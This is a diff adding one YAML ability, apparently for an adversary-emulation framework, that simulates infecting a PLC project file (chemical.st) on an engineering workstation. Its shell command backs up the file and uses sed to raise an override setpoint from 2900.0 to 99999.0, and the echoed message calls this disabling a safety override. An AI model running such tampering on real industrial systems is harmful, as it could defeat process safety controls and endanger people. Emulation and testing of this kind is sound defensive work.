@@ -1,0 +1,19 @@
+---
+
+- id: e5f6a7b8-5555-5555-5555-000000000006
+  name: Infect PLC Project File on EWS
+  description: |
+    Modify the chemical.st project file on the EWS to include
+    malicious logic. When the engineer next uploads to the PLC,
+    the infected program replaces the legitimate one.
+  tactic: persistence
+  technique_id: T0873
+  technique_name: Project File Infection
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      cp /home/engineer/Desktop/chemical.st /tmp/backup_chemical.st &&
+      sed -i 's/override_sp_real : REAL := 2900.0/override_sp_real : REAL := 99999.0/'
+      /home/engineer/Desktop/chemical.st &&
+      echo "Project file modified - safety override disabled"
